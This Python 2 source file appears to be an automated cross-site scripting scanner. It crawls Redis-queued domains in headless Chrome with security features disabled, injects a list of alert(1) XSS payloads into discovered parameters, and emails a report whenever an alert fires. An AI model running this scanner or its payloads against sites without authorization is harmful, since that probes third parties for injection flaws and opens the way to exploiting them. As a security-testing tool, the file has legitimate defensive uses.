import re
import time
import redis
import smtplib
import selenium
import lxml.html as html

from urlparse import urlparse
from selenium import webdriver
from selenium.common.exceptions import *
from selenium.webdriver.chrome.options import Options

from email.header import Header
from email.message import Message
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import settings
import argparse

prefs = {"profile.managed_default_content_settings.images":2}

chrome_options = Options()  
chrome_options.add_argument("--headless")  
chrome_options.add_argument('--ignore-certificate-errors')
chrome_options.add_argument('--disable-web-security')
chrome_options.add_argument('--disable-xss-auditor')
chrome_options.add_experimental_option("prefs",prefs)

driver = webdriver.Chrome('/usr/local/bin/chromedriver', chrome_options=chrome_options) 
redis_conn = redis.StrictRedis(host='localhost', port=6379, db=1)

js_var_extractors = [
                     re.compile(r"([a-zA-Z_]\w*)\[([a-zA-Z_]\w*)*\w*\]"), # array regexp
                     re.compile(r"var\s+([a-zA-Z_]\w*)"),                 # var name regexp   
                     re.compile(r"([a-zA-Z_]\w*)\.([a-zA-Z_]\w*)\.*"),    # class hierarchy
                     re.compile(r"([a-zA-Z_]\w*)\s*=\s*\w"),              # name = value
                     re.compile(r"\w+\s*=\s*([a-zA-Z_]\w*)"),             # smth = name 
                     re.compile(r'''[\"\']([a-zA-Z_]\w*)[\"\']:[\"\']\w*[\"\']''') # "name":"value"
                    ]

js_keywords = set([
                        'abstract','arguments','boolean','break','byte',
                        'case','catch','char','class*','const',
                        'continue','debugger','default','delete','do',
                        'double','else','enum*','eval','export*',
                        'extends*','false','final','finally','float',
                        'for','function','goto','if','implements',
                        'import','in','instanceof','int','interface',
                        'let','long','native','new','null',
                        'package','private','protected','public','return',
                        'short','static','super*','switch','synchronized',
                        'this','throw','throws','transient','true',
                        'try','typeof','var','void','volatile',
                        'while','with','yield'
                    ])

js_datatypes = set(["Array", "Date" ,"function",
                    "hasOwnProperty", "Infinity","isFinite", "isNaN",
                    "isPrototypeOf","Math","NaN",
                    "Number","Object","prototype"
                    "String","toString","undefined","valueOf"])

js_keywords.update(js_datatypes)

reserved_keywords = set(["alert", "all", "anchor", "anchors",
                         "area", "assign", "blur", "button",
                         "checkbox", "clearInterval", "clearTimeout", "clientInformation",
                         "close", "closed", "confirm","constructor",
                         "crypto", "decodeURI", "decodeURIComponent", "defaultStatus",
                         "document","element","elements", "embed",
                         "embeds","encodeURI","encodeURIComponent","escape",
                         "event","fileUpload","focus","form",
                         "forms","frame","innerHeight","innerWidth",
                         "layer","layers","link","location",
                         "mimeTypes","navigate","navigator","frames",
                         "frameRate","hidden", "history", "image",
                         "images","offscreenBuffering","open","opener",
                         "option","outerHeight","outerWidth","packages",
                         "pageXOffset","pageYOffset","parent","parseFloat",
                         "parseInt","password","pkcs11","plugin",
                         "prompt","propertyIsEnum", "radio","reset",
                         "screenX","screenY","scroll","secure",
                         "select","self","setInterval","setTimeout",
                         "status","submit","taint","text",
                         "textarea","top","unescape","untaint","window"])

reserved_small = set(["alert","innerHTML","self","setTimeout","window","clearTimeout"])
js_keywords.update(reserved_small)


xss_payloads = ['''<img src=x id/=' onerror=alert(1)//'>''',
                '''<svg onload=alert(1)>''',
                '''<img src=x onerror=alert(1)>''',
                '''<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>''',
                '''data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==''',
                '''PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==''',
                '''javascript:alert(1)''',
                '''<script>alert(1)</script>''',
                '''<script>alert(1)<\/script>''',
                '''"`><img src=xx onerror=alert(1)//">''',
                '''"><img src=xx onerror=alert(1)//">''',
                '''alert(1);''']
payload_alerts = set("1")

content_ext = ".jpg.png.gif.bmp.svg.ico.js.css"

def extract_jsvar_fast(script):
    vlist = list()
    for regexp in js_var_extractors:
        for match in re.findall(regexp,script):
            for vname in match:
                vlist.append(vname)

    return set(vlist)

def reset_driver():
    global driver
    driver.quit()
    driver = webdriver.Chrome(settings.chrome_path, chrome_options=chrome_options) 

def send_report(user_email,password,mail_to,subject,data,server_name):
    server = smtplib.SMTP_SSL(server_name)
    server.login(user_email, password)
    mail_from = user_email
    msg = MIMEMultipart()

    msg["Subject"] = Header(subject,"utf-8")
    msg["From"] = mail_from
    msg["To"] = mail_to

    msg_text = MIMEText(data.encode("utf-8"), "plain", "utf-8")
    msg.attach(msg_text)
    
    print "Sending mail to {}".format(mail_to)
    server.sendmail(mail_from , mail_to, msg.as_string())
    server.quit()

def notify(data, subject):
    email = settings.email
    password = settings.password 
    target_email = settings.target_email
    smtp_server = settings.smtp_server
    
    send_report(email,password,target_email,subject, data,smtp_server)

def check_url(redis_conn, url):
    if redis_conn.get("".join(("crawler/queue/", url))) != None:
        return False
    if redis_conn.get("".join(("crawler/processing/", url))) != None:
        return False
    if redis_conn.get("".join(("crawler/done/", url))) != None:
        return False
    return True


def process_url(url, worker_name):
    parsed_url = urlparse(url)

    try:
        driver.get(url)
        doc = html.fromstring(driver.page_source)

    except UnexpectedAlertPresentException:
        alert = driver.switch_to.alert
        alert.accept()
        doc = html.fromstring(driver.page_source)

    except:
        reset_driver()
        driver.get(url)
        doc = html.fromstring(driver.page_source)
    
    page_links = []
    page_links += doc.xpath(".//*/@href")
    page_links += doc.xpath(".//*/@src")
    page_links += doc.xpath(".//*/@action")

    sites = set()
    params = set()
    all_variables = set()

    for lnk in page_links:
        tmp = lnk.split('?')
        if len(tmp) > 1:
            params.add(tmp[1])
            
        main_part = tmp[0]
        main_part.strip().split('#')[0]
    
        if content_ext.find(main_part.split('.')[-1]) == -1:
            if main_part.startswith('http'):
                sites.add(main_part)
            else:
                if main_part.startswith('//'):
                    sites.add("".join((parsed_url.scheme,'://',main_part[2:])))
                else:
                    if main_part.startswith('/'):
                        sites.add("".join((parsed_url.scheme,'://', parsed_url.netloc, main_part)))

    request_vars = list()
    for p in list(params):
        tmp = p.split('&')
        for i in tmp:
            request_vars.append(i.split('=')[0])
        
    all_variables.update(set(request_vars))
    
    domains = set()
    for domain in redis_conn.scan_iter("crawler/domains/*"):
        domain = domain.replace("crawler/domains/","")
        domains.add(domain)

    for site_url in sites:
        for domain in domains:
            if site_url.find(domain) != -1:
                if check_url(redis_conn, site_url):
                    redis_conn.set("".join(("crawler/queue/", site_url)), str(worker_name))

    doc_scripts = doc.xpath(".//script/text()")
    for script in doc_scripts:
        all_variables.update(extract_jsvar_fast(script))

    xss_requests = []
    req = "".join((url,"?"))

    for payload in xss_payloads:
        for var in all_variables:
            tmp = "".join((var,"=",payload,"&"))
            if len(req) + len(tmp) > settings.maxurllen:
                xss_requests.append(req[:-1])
                req = "".join((url,"?"))
                req += tmp
            else:
                req += tmp

    for req in xss_requests:
        try:
            driver.get(req)
        except UnexpectedAlertPresentException:
            alert = driver.switch_to.alert
            data = "Alert {} was found on {}".format(alert.text,req)
            notify(data=data,subject="XSS was found!")
            alert.accept()
            driver.get(req)
        except:
            print "Exception"
            reset_driver()
        
    try:
        alert = driver.switch_to.alert
        data = "Alert {} was found on {}".format(alert.text,req)
        notify(data=data,subject="XSS was found!")
        alert.accept()

    except NoAlertPresentException:
        pass

    except:
        print "Exception"
        reset_driver()

   
    

def main():
    parser = argparse.ArgumentParser(description='Run gathering game with AI')
    parser.add_argument('--name', type=str, default="Noname")
    args = parser.parse_args()

    worker_name = args.name

    while True:
        try:
            key = next(redis_conn.scan_iter("crawler/queue/*"))
            url = key.replace("crawler/queue/","")
            processing_key = "".join(("crawler/processing/", url))
        
        except StopIteration:
            time.sleep(5.0)

        redis_conn.set(processing_key, str(worker_name))
        redis_conn.delete(key)

        try:
            process_url(url, worker_name)
            redis_conn.delete(processing_key)
            redis_conn.set("".join(("crawler/done/",url)), str(worker_name))

        except: #TODO Add smarter exception handler
            redis_conn.delete(processing_key)
            redis_conn.set(key, str(worker_name))
            reset_driver()

if __name__ == "__main__":
    main()
    
#TODO Add logger
#TODO Add Cookie